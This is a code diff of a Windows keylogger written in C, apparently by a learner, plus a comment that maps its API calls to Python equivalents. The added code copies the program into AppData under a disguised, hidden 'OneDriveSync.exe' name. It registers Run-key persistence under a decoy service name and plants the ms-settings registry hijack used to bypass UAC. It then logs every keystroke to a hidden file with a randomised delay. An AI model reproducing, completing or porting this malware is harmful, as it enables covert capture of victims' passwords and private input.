@@ -1,51 +1,87 @@
 #include <windows.h>
 #include <shlobj.h>
-#pragma comment(lib, "shell.lib")
-void move_to_appdate(char *dst){
+#include <stdio.h>
+#include <string.h>
+
+#pragma comment(lib, "shell32.lib")
+
+void move_to_appdata(char *dst){
     char app[MAX_PATH], self[MAX_PATH]; //'app' holds the destination path. 'self' holds the current
     SHGetFolderPathA(0, CSIDL_APPDATA, 0, 0, app); //finds %APPDATA path
     lstrcatA(app, "\\Microsoft\\Windows\\OneDriveSync.exe");
     GetModuleFileNameA(0, self, MAX_PATH);
     if (lstrcmpiA(app, self) != 0) { // check if its already there 
         CopyFileA(self, app, FALSE);
-        setFileAttributesA(app, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+        SetFileAttributesA(app, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
     }
     lstrcpyA(dst, app); //copies final path to dst
+} // why did windows api choose such complicated names im gonna cry i cant remember all this 
+void log_p(char *outPath) {
+    char appData[MAX_PATH];
+    SHGetFolderPathA(0, CSIDL_APPDATA, 0, 0, appData);
+    lstrcatA(appData, "\\Microsoft\\CLR_v4.0");
+    CreateDirectoryA(appData, 0);
+    lstrcatA(appData, "\\wincache.db");
+    lstrcpyA(outPath, appData);
 }
-void 
-void persist(const char *exePath) {
-    HKEY hKey;
-    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
-    RegSetValueExA(hKey, "WinSvc", 0, REG_SZ, (const BYTE*)exePath, lstrlenA(exePath) + 1);
-    RegCloseKey(hKey);
-} // adds to win registery 'Run','winsvc' is what task manager shows, uses ANSI because its smaller
-// no memory allocation at run time, avoid API's X'wchar_t*'X  2byts per char & i dont like api's, closes reg after use
+void persist(const char *path) {
+    HKEY k;
+    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &k);
+    RegSetValueExA(k, "WinSnv", 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
+    RegCloseKey(k);
+}
+void UAC_bypass(const char *path) {
+    HKEY k;
+    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", 0, 0, 0, KEY_WRITE, 0, &k, 0);
+    RegSetValueExA(k, 0, 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
+    RegSetValueExA(k, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
+    RegCloseKey(k);
+
+}
 int main() {
-    char path[MAX_PATH];
-    GetModuleFileNameA(NULL, path, MAX_PATH); // gets full path
-    persist(path);
+    char exePath[MAX_PATH];
+    char logPath[MAX_PATH];
+    move_to_appdata(exePath);
+    persist(exePath);
+    UAC_bypass(exePath);
 
-    HANDLE file = CreateFileA("log.txt", FILE_APPEND_DATA, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (file == INVALID_HANDLE_VALUE) return 1;
-	// CreateFileA instead of fopen for lower footprint, fails = exit early, FILE* goes through stdio too much mem
+    log_p(logPath);
 
-    DWORD written;
+    HANDLE f = CreateFileA(
+        logPath,
+        FILE_APPEND_DATA,
+        FILE_SHARE_WRITE,
+        0,
+        OPEN_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,   // to open file
+        0
+    );
     char c;
-	// written holds number of bytes which WriteFIle needs, c stored current char to log
+    DWORD w;
 
-    while (1) {
+    while(1) {
         for (short k = 8; k < 256; k++) {
-            SHORT s = GetAsyncKeyState(k); //checks if key was just pressed
-            if (s & 0x0001) { 
-                if (k >= 32 && k <= 126) { // 32=space 126=~,
-                    c = (char)k; // obviosly convers k to char 
-                    WriteFile(file, &c, 1, &written, NULL);
-                }
+            SHORT s = GetAsyncKeyState(k);
+            if (s & 1 && k >= 32 && k <= 126) {
+                c = (char)k;
+                WriteFile(f, &c, 1, &w, 0);
             }
         }
-        Sleep(25); // so it doesnt eat the target system
+        Sleep(30 + (rand() % 30));
     }
-
-    CloseHandle(file);
-    return 0;
 }
+
+/* SHGetFolderPathA = os.getenv("APPDATA")
+GetModuleFileNameA = sys.executable
+lstrcatA / lstrcpyA = + operator / assignment
+CopyFileA = shutil.copy2
+SetFileAttributesA = ctypes.windll.kernel32.SetFileAttributesW
+CreateDirectoryA = os.makedirs
+CreateFileA = open()
+WriteFile = file.write()
+Sleep = time.sleep()
+rand() = random.randint()
+RegOpenKeyExA = winreg.OpenKey
+RegSetValueExA = winreg.SetValueEx
+RegCloseKey = winreg.CloseKey
+*/
